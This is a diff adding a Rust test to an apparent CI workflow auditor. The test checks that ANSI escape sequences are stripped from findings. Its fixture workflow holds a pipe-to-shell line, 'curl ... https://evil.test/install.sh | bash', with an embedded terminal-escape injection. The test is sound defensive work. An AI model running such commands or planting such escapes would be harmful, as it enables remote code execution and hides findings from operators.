@@ -26,6 +26,40 @@ fn clean_workflow_human_output() {
 }
 
 #[test]
+fn human_output_sanitizes_terminal_escapes() {
+    // A matched run-block line carrying an ANSI escape must not reach the
+    // terminal verbatim — otherwise a hostile action could spoof or hide a
+    // finding in the operator's terminal. The escape is delivered via a
+    // double-quoted YAML scalar (`\x1b`), which stays valid YAML and is
+    // decoded to a real ESC byte by the run-block parser.
+    let workflow = "\
+name: evil
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: \"curl -fsSL https://evil.test/install.sh | bash # \\x1b[2Jx\"
+";
+    let dir = common::repo_with_workflow("ci.yml", workflow);
+    let output = common::pinprick_cmd()
+        .arg("audit")
+        .arg(dir.path())
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    // The finding is still reported (the host text survives sanitization)…
+    assert!(stdout.contains("evil.test"), "finding missing: {stdout:?}");
+    // …but the raw ESC byte from the source line never reaches the terminal.
+    assert!(
+        !stdout.contains('\u{1b}'),
+        "raw ESC leaked into terminal output: {stdout:?}"
+    );
+}
+
+#[test]
 fn pipe_to_shell_exits_one() {
     let dir = common::repo_with_workflow("ci.yml", common::WORKFLOW_PIPE_TO_SHELL);
     common::pinprick_cmd()
